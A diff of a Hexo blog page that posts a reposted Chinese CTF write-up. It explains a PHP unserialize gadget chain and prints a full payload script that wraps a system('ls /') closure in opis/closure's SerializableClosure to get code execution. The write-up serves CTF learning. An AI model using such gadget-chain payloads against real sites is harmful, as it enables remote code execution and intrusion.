@@ -6,15 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Hexo</title>
+  <title>xxc | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/page/10/index.html">
+  <meta name="description" content="转载自qq群.师傅发布的md文件 xxc 打开网页提示一条链子，使用dirmap扫描到网站源码www.zip，进行代码审计。 index.php其中存在反序列化操作，这道题确定是一道序列化的题目：  123456789101112&lt;?phpinclude(&quot;closure&#x2F;autoload.php&quot;);function _loader($class)&amp;#123;    r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xxc">
+<meta property="og:url" content="http://example.com/2021/10/05/xxc/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="转载自qq群.师傅发布的md文件 xxc 打开网页提示一条链子，使用dirmap扫描到网站源码www.zip，进行代码审计。 index.php其中存在反序列化操作，这道题确定是一道序列化的题目：  123456789101112&lt;?phpinclude(&quot;closure&#x2F;autoload.php&quot;);function _loader($class)&amp;#123;    r">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318190.png">
+<meta property="article:published_time" content="2021-10-05T06:05:39.000Z">
+<meta property="article:modified_time" content="2021-10-05T06:07:42.703Z">
 <meta property="article:author" content="ouroborosscr">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318190.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -162,46 +168,141 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-攻防世界web新手区simple-php" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-xxc" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAsimple-php/">攻防世界web新手区simple_php</a>
+    <h1 class="article-title" itemprop="name">
+      xxc
     </h1>
   
 
         
         
 
+	<span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+		  <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+	</span>
 
-<a href="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAsimple-php/" class="archive-article-date">
-  	<time datetime="2021-03-14T11:55:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-14</time>
+
+
+<a href="/2021/10/05/xxc/" class="archive-article-date">
+  	<time datetime="2021-10-05T06:05:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-05</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>第六题，考php</p>
-<img src="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAsimple-php/simple_php1.PNG" class="" title="simple_php1.PNG">
-<img src="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAsimple-php/simple_php2.PNG" class="" title="simple_php2.PNG">
-<p>首先，读php。<br>读取a和b两个数据，</p>
-<p>先说a：<br>方法一<br>如果a的值等于0，且a不为0<br>（这里要用到php的弱语言属性）<br>值等于0，但本身不等于0的有false、”0”(字符串)、’0’（字符）等<br>尝试一下，可以得到一半flag</p>
-<img src="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAsimple-php/simple_php3.PNG" class="" title="simple_php3.PNG">
-<img src="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAsimple-php/simple_php4.PNG" class="" title="simple_php4.PNG">
-<img src="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAsimple-php/simple_php5.PNG" class="" title="simple_php5.PNG">
-<p>方法二<br>让a等于一个并未赋值的c<br>c为空，所以在比较时数值为0，但是c存在，所以自己后面也是true</p>
-<img src="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAsimple-php/simple_php7.PNG" class="" title="simple_php7.PNG">
+        <p>转载自qq群<code>.</code>师傅发布的md文件</p>
+<h3 id="xxc"><a href="#xxc" class="headerlink" title="xxc"></a>xxc</h3><ul>
+<li>打开网页提示<code>一条链子</code>，使用dirmap扫描到网站源码<a target="_blank" rel="noopener" href="http://www.zip,进行代码审计./">www.zip，进行代码审计。</a></li>
+<li>index.php其中存在反序列化操作，这道题确定是一道序列化的题目：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_loader</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;./class/&#x27;</span> . (str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$class</span>) . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(<span class="string">&quot;_loader&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])&#123;</span><br><span class="line">    unserialize(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;一条链子&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>然后再说b：<br>is_numeric()的意思是判断是否为数字，是为true<br>所以后面的代码先判断b是否为数字，是的话则跳出程序<br>之后的if($b&gt;1234)再判断是否大于1234<br>还是考的弱语言<br>让b=2222a<br>读入的时候自动存为字符串，但是进行比较时会自动转成数字并消去后面的a（比较时根据最左边的数据来判断转成什么类型，所以a2222就不行，会转成字符串然后转成0）<br>得到后面的一半flag</p>
-<img src="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAsimple-php/simple_php6.PNG" class="" title="simple_php6.PNG">
+<ul>
+<li><p>我们先来学习一下<code>_loader()</code>函数，这是一个自动加载函数，在PHP5中，当我们实例化一个未定义的类时，就会触发此函数。</p>
+</li>
+<li><p><code>spl_autoload_register(&#39;loadprint&#39;)</code>与<code>__autoload()</code>函数有异曲同工之妙，PHP碰到没有定义的类就执行<code>loadprint()</code>函数。</p>
+</li>
+<li><p>所以我们在<code>index.php</code>中可以自由的实例化存在的类。由于是反序列化的题目，我们先来看看入口点<code>__destruct()</code>和<code>__wakeup()</code>函数是否存在：</p>
+<ul>
+<li><code>\Control\State\StopHook.php</code>中发现了析构函数，调用了同类中的<code>_exit()</code>函数，其中<code>$process-&gt;stop();</code>可能会触发<code>__call()</code>函数，而<code>!$process-&gt;isRunning</code>可能会触发<code>__get()</code>函数：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Control</span>\<span class="title">State</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StopHook</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [<span class="string">&#x27;auto&#x27;</span> =&gt; <span class="number">0</span>];</span><br><span class="line">    <span class="keyword">protected</span> <span class="built_in">static</span> <span class="variable">$states</span> = [<span class="string">&#x27;started&#x27;</span>, <span class="string">&#x27;running&#x27;</span>, <span class="string">&#x27;finished&#x27;</span>, <span class="string">&#x27;waiting&#x27;</span>, <span class="string">&#x27;fail&#x27;</span>];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$processes</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_exit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_exit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> <span class="variable">$process</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$process</span>-&gt;isRunning) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$process</span>-&gt;stop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在<code>\Faker\MyGenerator.php</code>中找到这两个函数，<code>__call()</code>函数中<code>echo $this-&gt;defaultCall;</code>一句可能会触发<code>__toString()</code>函数：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$defaultValue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$arg_array</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;defaultCall;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;defaultCall;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$property</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;defaultValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在<code>\Method\Func\GetFile.php</code>找到<code>__toString()</code>函数，调用了同类中的<code>getFiles()</code>函数，发现函数的中调用了<code>isset()</code>函数，如果该类中不存在该属性，会触发<code>__isset()</code>函数：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFile</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getFiles();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFiles</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;flag) <span class="keyword">return</span> <span class="string">&quot;denied&quot;</span>;</span><br><span class="line">        <span class="variable">$s</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;flag-&gt;&#123;<span class="keyword">$this</span>-&gt;value&#125;)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable">$s</span> += <span class="variable">$file</span>-&gt;read();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在<code>Method\Func\GetDefault.php</code>中找到<code>__isset()</code>函数，调用了同类中的<code>popup()</code>函数，其中<code>return $s($length);</code>可能会触发<code>__invoke()</code>函数：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetDefault</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">popup</span>(<span class="params"><span class="variable">$length</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$s</span>-&gt;flag != <span class="string">&quot;myTest&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;denied&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s</span>(<span class="variable">$length</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$property</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$property</span> != <span class="string">&quot;test&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;popup(<span class="number">666</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>最后在<code>\Method\Func\GenerateFile.php</code>中找到<code>__invoke()</code>函数，且存在<code>call_user_func()</code>。没有想到在php5中是可以直接赋值在一个没有初始化的变量上的2333。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenerateFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$buffer</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$param</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;myGen(<span class="variable">$param</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myGen</span>(<span class="params"><span class="variable">$length</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="keyword">$this</span>-&gt;buffer-&gt;read;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;source-&gt;generate, <span class="variable">$length</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>整个链子理清楚了，但是发现<code>call_user_func()</code>的第二个参数被写死了，因为<code>$this-&gt;popup(666);</code>调用的时候将<code>666</code>传入了<code>__invoke($param)</code>，最后也就作为<code>$length</code>变量传入了<code>myGen($length)</code>函数。</p>
+</li>
+<li><p>现在只能够调用类似<code>phpinfo()</code>等不需要参数的程序，并不能够rce，该怎么办呢？</p>
+<ul>
+<li>这时候我们注意到存在<code>function.php</code>，发现这个cms是基于<code>opis/closure</code>搭建的，网址：<a target="_blank" rel="noopener" href="https://github.com/opis/closure">https://github.com/opis/closure</a></li>
+<li>该项目是用来闭包类对象的，官方文档：<a target="_blank" rel="noopener" href="https://opis.io/closure/3.x/serialize.html%E3%80%82php%E4%B8%AD%E7%9A%84%E9%97%AD%E5%8C%85%E5%87%BD%E6%95%B0%EF%BC%88%E4%BB%85%E5%AF%B9php%EF%BC%89%E5%8D%B3%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B8%80%E8%88%AC%E6%98%AF%E6%97%A0%E6%B3%95%E8%BF%9B%E8%A1%8C%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%EF%BC%8C%E4%B8%80%E8%88%AC%E4%BC%9A%E6%8A%A5%E9%94%99%EF%BC%9A">https://opis.io/closure/3.x/serialize.html。php中的闭包函数（仅对php）即匿名函数，一般是无法进行序列化的，一般会报错：</a></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>)); &#125;;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$function</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught exception &#39;Exception&#39; with message &#39;Serialization of &#39;Closure&#39; is not allowed&#39;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用这个项目，可以将闭包包装成一个<code>Opis\Closure\SerializableClosure</code>对象，然后使用标准的<code>serialize()</code>进行序列化。也可以使用<code>Opis\Closure\serialize</code>函数序列化任意对象。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>)); &#125;;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> \Opis\<span class="built_in">Closure</span>\SerializableClosure(<span class="variable">$function</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>)); &#125;;</span><br><span class="line"><span class="keyword">echo</span> \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$function</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:32:&quot;Opis\Closure\SerializableClosure&quot;:156:&#123;a:5:&#123;s:3:&quot;use&quot;;a:0:&#123;&#125;s:8:&quot;function&quot;;s:33:&quot;function()&#123; eval(\system(&#39;ls&#39;));&#125;&quot;;s:5:&quot;scope&quot;;N;s:4:&quot;this&quot;;N;s:4:&quot;self&quot;;s:32:&quot;0000000054d6224100000000237e90a4&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>那么我们可以将匿名函数通过<code>serialize()</code>函数经过一次序列化和反序列化，这样他就能作为<code>SerializableClosure</code>对象被序列化。或者直接将<code>generate</code>变量赋值为<code>SerializableClosure</code>类。</p>
+</li>
+<li><p>payload：</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Control</span>\<span class="title">State</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">StopHook</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; processes = <span class="keyword">array</span>(<span class="keyword">new</span> \Faker\MyGenerator());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="keyword">new</span> StopHook();</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$payload</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MyGenerator</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">defaultValue</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; defaultValue = <span class="keyword">new</span> \Method\Func\GetFile();</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GetFile</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">flag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; flag = <span class="keyword">new</span> \Method\Func\GetDefault();</span><br><span class="line">            <span class="keyword">$this</span> -&gt; value = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GetDefault</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">source</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; source = <span class="keyword">new</span> \Method\Func\GenerateFile();</span><br><span class="line">            <span class="keyword">$this</span> -&gt; source -&gt; flag = <span class="string">&#x27;myTest&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenerateFile</span> &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">flag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$buffer</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls /&#x27;</span>)); &#125;;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; source -&gt; generate = <span class="keyword">new</span> \Opis\<span class="built_in">Closure</span>\SerializableClosure(<span class="variable">$function</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将php文件放在<code>/www</code>文件夹下运行，得到序列化的结果（其实在php5中赋值一个对象在一个空变量中是会警告的<code>HP Warning:  Creating default object from empty value in /var/www/1.php on line 51</code>，在php8中就直接报错了）：</li>
+</ul>
